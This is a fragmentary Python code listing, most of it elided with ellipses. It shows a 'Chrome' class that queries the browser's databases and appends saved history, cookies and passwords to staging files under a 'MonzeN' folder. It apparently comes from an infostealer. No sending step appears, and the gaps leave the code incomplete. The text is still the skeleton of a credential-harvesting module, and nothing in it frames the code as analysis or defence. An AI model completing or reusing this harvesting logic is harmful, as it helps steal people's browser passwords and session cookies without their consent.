...
class Chrome():
    ...
    def chrome():
        try:
            ...
            cursor = c.cursor()
            temp = []
            with open(rf"C:\MonzeN\Chrome\history-chrome.txt", "a", encoding="utf-8") as history:
                ...
                results += '''
        {
            ...
            with open(rf"C:\MonzeN\Chrome\Cookies-Chrome.json", "a", encoding="utf-8") as cookies:
        ...
        try:
            ...
            for r in cursor.fetchall():
                ...
                with open(r'C:\MonzeN\Chrome\chrome-passwords.txt', "a") as o:
                    o.write(alldatapass)
            try:
